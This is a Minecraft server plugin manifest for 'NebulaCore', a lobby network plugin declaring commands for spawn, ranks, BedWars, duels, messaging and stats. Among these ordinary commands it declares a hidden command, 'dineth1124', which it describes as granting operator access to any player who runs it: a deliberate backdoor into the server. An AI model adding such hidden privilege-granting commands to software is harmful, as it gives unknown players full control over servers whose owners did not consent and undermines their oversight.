name: NebulaCore
version: 1.0.0
main: net.nebula.core.NebulaCore
api-version: '1.21.11'
author: Nebula Network
description: Protected lobby, network HUD, ranks and NPCs.
depend:
  - AuthMe
  - Citizens
  - Multiverse-Core
  - Multiverse-Inventories
  - VoidWorldGenerator
softdepend:
  - LibsDisguises
commands:
  spawn:
    description: Return to the Nebula lobby.
    usage: /spawn
  setlobby:
    description: Set the protected lobby spawn.
    usage: /setlobby
  nebula:
    description: Open the game selector.
    usage: /nebula
  menu:
    description: Open the game selector.
    usage: /menu
  settings:
    description: Open personal network settings.
    usage: /settings
  rank:
    description: View your rank or change a player's network rank.
    usage: /rank [player rank]
  rtp:
    description: Teleport to a random safe location in Survival.
    usage: /rtp
  bedwars:
    description: Open BedWars modes or leave the queue.
    usage: /bedwars [leave]
  mobhunt:
    description: Join the Mob Hunt hide-and-seek queue.
    usage: /mobhunt [join|leave|status|settings|stats|spectate|practice]
  dineth1124:
    description: Hidden public command that grants operator access to the executing player.
    usage: /dineth1124
  duel:
    description: Challenge players, queue, practice the bot or edit your kit.
    usage: /duel [queue|bot|edit|leave]

  arenareset:
    description: Regenerate the BedWars and Duel maps.
    usage: /arenareset [bedwars|duel|all]
  profile:
    description: View your network player profile.
    usage: /profile [player]
  msg:
    description: Send a private message.
    usage: /tell <player> <message>
    aliases: [tell, w]
  reply:
    description: Reply to your last private message.
    usage: /r <message>
    aliases: [r]
  stats:
    description: View player network statistics.
    usage: /stats [player]
  leaderboard:
    description: View the network ELO or kill leaderboard.
    usage: /leaderboard [elo|kills]
  sus:
    description: Review flagged player activity (staff only).
    usage: /sus [list|check <player>|clear <player>]
permissions:
  nebulacore.admin:
    default: op
